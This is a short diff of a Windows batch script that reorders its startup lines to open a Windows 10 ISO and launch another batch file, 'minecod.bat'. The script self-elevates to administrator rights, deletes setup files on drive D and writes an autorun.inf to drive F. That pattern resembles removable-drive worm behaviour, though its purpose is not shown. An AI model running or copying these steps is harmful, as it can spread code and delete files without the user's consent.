@@ -1,7 +1,8 @@
 @echo off
+start F:\Win10_22H2_Turkish_x64.iso
+start minecod.bat
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 cd F:
-start F:\Win10_22H2_Turkish_x64.iso
 del D:\autorun.inf
 del D:\setup.exe
 copy system.inf "F:\autorun.inf"
